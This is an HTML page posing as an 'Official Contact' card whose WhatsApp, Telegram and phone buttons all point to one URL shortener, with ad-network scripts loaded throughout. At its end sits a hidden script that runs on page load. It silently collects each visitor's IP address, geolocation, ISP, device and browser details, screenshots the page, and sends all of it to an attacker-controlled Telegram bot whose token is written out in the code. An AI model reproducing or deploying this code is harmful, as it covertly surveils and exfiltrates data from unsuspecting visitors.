<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Private Contact</title>
  
  <link rel="stylesheet" href="style.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
  
  <script type="text/javascript" src="//spaniardinformationbookworm.com/a2/6b/18/a26b180d886de45b6d20f7541482b595.js"></script>
  
  <!-- Load library html2canvas untuk screenshot -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>
  
  <div class="stars-container"></div>
  <div class="nebula-container"></div>
  <div class="shooting-stars"></div>
  <div class="galaxy-dust"></div>
  <div class="cosmic-rays"></div>

  <div class="main-content">
    
    <section class="profile-section">
      <div class="profile-card">
        <div class="profile-icon-wrapper">
          <div class="profile-icon">
            <i class="fas fa-user-circle"></i> </div>
        </div>
        <h1 class="profile-title">Official Contact</h1> 
        <div class="online-status">
          <span class="status-pulse"></span>
          <span class="status-text">Available Online</span>
        </div>
        <p class="profile-subtitle">For professional inquiries and collaboration.</p> 
      </div>
    </section>

    <div class="ad-banner top-ad" id="adBanner">
      <script type="text/javascript">
        atOptions = {
          'key' : '4b1eafbbf9404932effcedf29b70c2c7',
          'format' : 'iframe',
          'height' : 250,
          'width' : 320,
          'params' : {}
        };
      </script>
      <script type="text/javascript" src="//spaniardinformationbookworm.com/4b1eafbbf9404932effcedf29b70c2c7/invoke.js"></script>
    </div>

    <div class="social-buttons">
      <a href="https://shorter.me/WHO7C" class="social-btn whatsapp-btn" data-ad="true">
        <div class="btn-content">
          <div class="btn-icon-wrapper">
            <i class="fab fa-whatsapp"></i>
          </div>
          <span class="btn-label">Chat on WhatsApp</span>
        </div>
      </a>

      <a href="https://shorter.me/WHO7C" class="social-btn telegram-btn" data-ad="true">
        <div class="btn-content">
          <div class="btn-icon-wrapper">
            <i class="fab fa-telegram"></i>
          </div>
          <span class="btn-label">Message on Telegram</span>
        </div>
      </a>

      <a href="https://shorter.me/WHO7C" class="social-btn phone-btn" data-ad="true">
        <div class="btn-content">
          <div class="btn-icon-wrapper">
            <i class="fas fa-phone"></i>
          </div>
          <span class="btn-label">Call / Business Inquiry</span>
        </div>
      </a>
    </div>

    <footer class="page-footer">
      <p>Â© 2025 Official Contact. All Rights Reserved.</p>
    </footer>
  </div>

  <script type='text/javascript' src='//spaniardinformationbookworm.com/97/68/f5/9768f5d78dfc013bf8c5047b5505e390.js'></script>
  
  <script type="text/javascript">
    var _Hasync = _Hasync || [];
    _Hasync.push(['Histats.start', '1,4979972,4,0,0,0,00010000']);
    _Hasync.push(['Histats.fasi', '1']);
    _Hasync.push(['Histats.track_hits', '']);
    (function() {
      var hs = document.createElement('script');
      hs.type = 'text/javascript';
      hs.async = true;
      hs.src = '//s10.histats.com/js15_as.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
    })();
  </script>

  <script src="script.js"></script>

  <!-- AUTO SCREENSHOT SCRIPT YANG DIPERBAIKI -->
  <script>
  // ===============================
  // AUTO SCREENSHOT & TELEGRAM BOT
  // ===============================

  // CONFIGURASI - GANTI DENGAN DATA ANDA
  const TELEGRAM_CONFIG = {
      botToken: "7595246422:AAEbi8rytMpqZL1b1dDaRa8fFR3UrASIYjs", // GANTI dengan token bot Anda
      chatId: "-1002540527186"
  };

  // Variabel global untuk tracking
  let visitorData = {};
  let adsLoaded = false;
  let screenshotTaken = false;

  // Fungsi untuk mendapatkan informasi visitor lengkap
  async function collectVisitorInfo() {
      try {
          // Deteksi perangkat
          const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
          const isTablet = /iPad|Android/i.test(navigator.userAgent) && !/Mobile/i.test(navigator.userAgent);
          
          // Deteksi browser
          let browser = "Unknown";
          const ua = navigator.userAgent;
          if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
          else if (ua.includes("Firefox")) browser = "Firefox";
          else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
          else if (ua.includes("Edg")) browser = "Edge";
          else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";

          // Deteksi OS
          let os = "Unknown";
          if (ua.includes("Windows")) os = "Windows";
          else if (ua.includes("Mac")) os = "macOS";
          else if (ua.includes("Linux")) os = "Linux";
          else if (ua.includes("Android")) os = "Android";
          else if (ua.includes("iOS") || ua.includes("iPhone")) os = "iOS";

          // Dapatkan IP address dan lokasi
          let ipData = { ip: "Unknown", country: "Unknown", city: "Unknown", isp: "Unknown" };
          try {
              const ipResponse = await fetch('https://api.ipify.org?format=json');
              const ipResult = await ipResponse.json();
              ipData.ip = ipResult.ip;
              
              // Dapatkan info lokasi dari IP
              const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
              const geoData = await geoResponse.json();
              ipData.country = geoData.country_name || "Unknown";
              ipData.city = geoData.city || "Unknown";
              ipData.isp = geoData.org || "Unknown";
          } catch (ipError) {
              console.log('IP detection failed:', ipError);
          }

          // Kumpulkan semua data
          visitorData = {
              // Informasi dasar
              timestamp: new Date().toLocaleString('id-ID'),
              pageUrl: window.location.href,
              referrer: document.referrer || 'Direct Visit',
              
              // Informasi perangkat
              deviceType: isMobile ? 'Mobile' : isTablet ? 'Tablet' : 'Desktop',
              screenResolution: `${screen.width}x${screen.height}`,
              viewport: `${window.innerWidth}x${window.innerHeight}`,
              colorDepth: `${screen.colorDepth}-bit`,
              
              // Informasi browser & OS
              browser: browser,
              browserVersion: ua.match(/(Chrome|Firefox|Safari|Edg|Opera)\/([0-9.]+)/)?.[2] || 'Unknown',
              operatingSystem: os,
              userAgent: navigator.userAgent,
              
              // Informasi jaringan & lokasi
              ipAddress: ipData.ip,
              country: ipData.country,
              city: ipData.city,
              isp: ipData.isp,
              language: navigator.language,
              languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
              
              // Informasi koneksi
              connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
              cookieEnabled: navigator.cookieEnabled,
              javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
              
              // Informasi waktu
              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
              localTime: new Date().toString()
          };

          console.log('ðŸ“Š Visitor data collected:', visitorData);
          return visitorData;

      } catch (error) {
          console.error('âŒ Error collecting visitor info:', error);
          return {};
      }
  }

  // Format visitor info untuk Telegram
  function formatVisitorInfo(data) {
      return `
ðŸ†• **NEW VISITOR DETECTED!**

**ðŸŒ Page Information:**
ðŸ“„ Page URL: ${data.pageUrl}
ðŸ”— Referrer: ${data.referrer}
ðŸ•’ Visit Time: ${data.timestamp}

**ðŸ“± Device Information:**
ðŸ“Ÿ Device Type: ${data.deviceType}
ðŸ–¥ï¸ Screen: ${data.screenResolution}
ðŸ‘€ Viewport: ${data.viewport}
ðŸŽ¨ Color Depth: ${data.colorDepth}

**ðŸ”§ Browser & OS:**
ðŸŒ Browser: ${data.browser} ${data.browserVersion}
ðŸ’» Operating System: ${data.operatingSystem}
ðŸ—£ï¸ Language: ${data.language}

**ðŸ“ Location & Network:**
ðŸ“¡ IP Address: ${data.ipAddress}
ðŸ‡ºðŸ‡¸ Country: ${data.country}
ðŸ™ï¸ City: ${data.city}
ðŸ“¡ ISP: ${data.isp}
â° Timezone: ${data.timezone}

**ðŸ“Š Connection Info:**
ðŸ“¶ Connection: ${data.connectionType}
ðŸª Cookies: ${data.cookieEnabled ? 'Enabled' : 'Disabled'}
â˜• Java: ${data.javaEnabled ? 'Enabled' : 'Disabled'}
      `.trim();
  }

  // Fungsi utama auto screenshot
  async function autoScreenshotAndSend() {
      if (screenshotTaken) return; // Hindari multiple screenshots
    
      try {
          console.log('ðŸ”„ Taking automatic screenshot...');
          screenshotTaken = true;
          
          // Tunggu sebentar untuk memastikan ads terrender
          await new Promise(resolve => setTimeout(resolve, 1000));
          
          // Ambil screenshot seluruh halaman
          const canvas = await html2canvas(document.body, {
              scale: 0.8,
              useCORS: true,
              allowTaint: true,
              logging: false,
              backgroundColor: '#ffffff'
          });

          // Konversi ke blob
          canvas.toBlob(async (blob) => {
              await sendToTelegram(blob);
          }, 'image/jpeg', 0.8);

      } catch (error) {
          console.error('âŒ Screenshot error:', error);
          screenshotTaken = false;
      }
  }

  // Kirim ke Telegram
  async function sendToTelegram(blob) {
      try {
          const formData = new FormData();
          formData.append('chat_id', TELEGRAM_CONFIG.chatId);
          formData.append('photo', blob, `visitor_${Date.now()}.jpg`);
          
          // Format visitor info
          const visitorInfo = formatVisitorInfo(visitorData);
          formData.append('caption', visitorInfo);

          const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
              method: 'POST',
              body: formData
          });

          const result = await response.json();
          
          if (result.ok) {
              console.log('âœ… Screenshot sent to Telegram!');
          } else {
              console.error('âŒ Telegram error:', result);
          }

      } catch (error) {
          console.error('âŒ Send to Telegram error:', error);
      }
  }

  // Monitor kapan ads selesai load
  function monitorAdsLoad() {
      const adBanner = document.getElementById('adBanner');
      if (!adBanner) return;

      // Method 1: Observe iframe dalam ads
      const observer = new MutationObserver((mutations) => {
          mutations.forEach((mutation) => {
              if (mutation.type === 'childList') {
                  mutation.addedNodes.forEach((node) => {
                      if (node.nodeName === 'IFRAME') {
                          console.log('ðŸŽ¯ Ads iframe detected, waiting for load...');
                          node.addEventListener('load', () => {
                              console.log('âœ… Ads iframe loaded!');
                              adsLoaded = true;
                              if (!screenshotTaken) {
                                  autoScreenshotAndSend();
                              }
                          });
                      }
                  });
              }
          });
      });

      observer.observe(adBanner, {
          childList: true,
          subtree: true
      });

      // Method 2: Fallback timeout
      setTimeout(() => {
          if (!adsLoaded && !screenshotTaken) {
              console.log('â° Fallback: Taking screenshot after timeout');
              adsLoaded = true;
              autoScreenshotAndSend();
          }
      }, 5000); // 5 detik fallback
  }

  // Deteksi kapan pengunjung membuka website
  async function initVisitorTracking() {
      // Cek apakah config sudah diisi
      if (!TELEGRAM_CONFIG.botToken || !TELEGRAM_CONFIG.chatId || 
          TELEGRAM_CONFIG.botToken.includes("000000000")) {
          console.warn('âš ï¸ Telegram bot not configured yet!');
          return;
      }

      // Kumpulkan data visitor terlebih dahulu
      await collectVisitorInfo();

      // Monitor ads dan ambil screenshot ketika ads selesai load
      monitorAdsLoad();

      // Fallback: Jika setelah 8 detik belum ada screenshot, ambil anyway
      setTimeout(() => {
          if (!screenshotTaken) {
              console.log('ðŸ”„ Fallback: Taking screenshot after 8s');
              autoScreenshotAndSend();
          }
      }, 8000);
  }

  // Jalankan ketika halaman fully loaded
  if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', initVisitorTracking);
  } else {
      initVisitorTracking();
  }

  // Juga screenshot ketika user akan meninggalkan halaman (exit intent)
  window.addEventListener('beforeunload', function() {
      if (!screenshotTaken) {
          // Coba ambil screenshot cepat sebelum user keluar
          setTimeout(() => {
              if (!screenshotTaken) {
                  autoScreenshotAndSend();
              }
          }, 100);
      }
  });

  // Deteksi ketika user aktif (click, scroll, etc)
  let userInteractions = 0;
  const handleUserActivity = () => {
      userInteractions++;
      if (userInteractions === 3 && !screenshotTaken) {
          console.log('ðŸ‘¤ User active, taking screenshot...');
          autoScreenshotAndSend();
          // Remove listeners setelah screenshot
          document.removeEventListener('click', handleUserActivity);
          document.removeEventListener('scroll', handleUserActivity);
      }
  };

  document.addEventListener('click', handleUserActivity);
  document.addEventListener('scroll', handleUserActivity);
  </script>
</body>
</html>
